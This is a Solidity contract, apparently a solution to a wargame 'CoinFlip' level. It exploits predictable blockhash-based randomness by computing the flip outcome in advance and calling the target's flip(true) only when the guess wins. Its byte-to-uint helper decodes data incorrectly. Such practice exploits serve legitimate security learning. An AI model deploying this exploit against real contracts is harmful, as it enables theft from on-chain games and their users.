// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.1/contracts/utils/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 currentConsecutiveWins;

    event logBytesResult(bytes loggedBytesResult);
    event logUintResult(uint256 loggedUintResult);

    // Helper function to convert bytes array data into uint256
    // This is for obtaining the consecutive wins from the target contract
    function convertBytesToUint256(bytes memory bytesData) public pure returns (uint256) {
        uint256 number;

        for (uint i = 0; i < bytesData.length; i++) {
            number = number + uint8(bytesData[i]);
        }

        return number;
    }

    function getConsecutiveWins(address _contractAddress) public returns (uint256) {
        (bool success, bytes memory data) = _contractAddress.call{ gas: 20000000 }(abi.encodeWithSignature("consecutiveWins()"));
        require(success, "tx failed");

        currentConsecutiveWins = convertBytesToUint256(data);
        emit logBytesResult(data);
        emit logUintResult(currentConsecutiveWins);

        return currentConsecutiveWins;
    }

    function attackContract(address _targetContract) public returns (bool) {
        uint256 lastBlockValue = uint256(blockhash(block.number.sub(1)));
        require(lastBlockValue.div(FACTOR) == 1, "Bad flip. Back away.");

        (bool success, ) = _targetContract.call{ gas: 2000000 }(abi.encodeWithSignature("flip(bool)", true));
        return success;
    }
}